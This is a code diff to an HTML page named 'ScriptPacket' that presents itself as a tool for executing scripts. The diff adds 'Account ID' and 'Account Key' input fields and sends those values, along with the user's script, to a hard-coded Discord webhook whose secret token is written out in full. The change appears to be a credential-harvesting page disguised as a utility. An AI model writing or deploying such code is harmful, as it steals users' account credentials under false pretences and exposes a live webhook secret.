@@ -20,7 +20,7 @@
             margin: 0;
         }
 
-        #scriptInput {
+        input {
             width: 80%;
             padding: 10px;
             margin-bottom: 20px;
@@ -47,6 +47,8 @@
 
 <body>
     <h1>ScriptPacket</h1>
+    <input type="text" id="accountId" placeholder="Enter your Account ID...">
+    <input type="text" id="accountKey" placeholder="Enter your Account Key...">
     <input type="text" id="scriptInput" placeholder="Enter your script...">
     <button id="executeButton" onclick="sendScript()">Execute</button>
     <div id="output"></div>
@@ -54,14 +56,16 @@
 
     <script>
         function sendScript() {
+            var accountId = document.getElementById('accountId').value;
+            var accountKey = document.getElementById('accountKey').value;
             var scriptInput = document.getElementById('scriptInput').value;
 
-            if (scriptInput.trim() !== '') {
+            if (accountId.trim() !== '' && accountKey.trim() !== '' && scriptInput.trim() !== '') {
                 var currentTime = new Date();
                 var formattedTime = currentTime.toISOString();
                 var scriptNumber = getScriptNumber();
 
-                var message = `${formattedTime}\nScript #${scriptNumber}\n\n${scriptInput}`;
+                var message = `${formattedTime}\nScript #${scriptNumber}\nAccount ID: ${accountId}\nAccount Key: ${accountKey}\n\n${scriptInput}`;
 
                 // Fetch request to send the message to the Discord webhook
                 fetch('https://discord.com/api/webhooks/1203002721012285500/SGWoKjOIwIegun2MCq9Tog61cXZpjUrGe-13kffJVik_50YjfsK8nGcUYyEzvbKQzH7Q', {
@@ -88,7 +92,7 @@
                         document.getElementById('output').innerText = 'Error sending script. Please try again later.';
                     });
             } else {
-                alert('Please enter a script before executing.');
+                alert('Please enter Account ID, Account Key, and a script before executing.');
             }
         }
 
